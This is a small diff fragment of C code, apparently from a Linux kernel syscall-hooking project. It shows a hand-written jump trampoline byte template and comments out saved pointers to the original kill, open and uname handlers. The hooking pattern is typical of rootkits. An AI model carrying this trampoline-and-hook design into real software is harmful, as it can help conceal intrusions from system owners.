@@ -113,13 +113,13 @@ unsigned char JUMP_TEMPLATE[] = "\x48\xb8\x88\x77\x66\x55\x44\x33\x22\x11\x48\x8
 unsigned char *jump; // What gets populated by the JUMP_TEMPLATE. Instantiated with \x90 and sized by the h_len param in create_tramp function
 
 // Easy hooking hanglers
-int (*original_kill)(pid_t, int);
-int (*original_open)(const char *pathname, int flags, mode_t mode);
+//int (*original_kill)(pid_t, int);
+//int (*original_open)(const char *pathname, int flags, mode_t mode);
 // Not used
 //int (*original_getdents)(unsigned int, struct  linux_dirent *, unsigned int);
 //int (*original_getdents64)(unsigned int, struct linux_dirent *, unsigned int);
 //int (*original_open)(const char *, int, mode_t);
-int (*original_uname)(struct utsname *);
+//int (*original_uname)(struct utsname *);
 
 
 struct Hook **hooks;
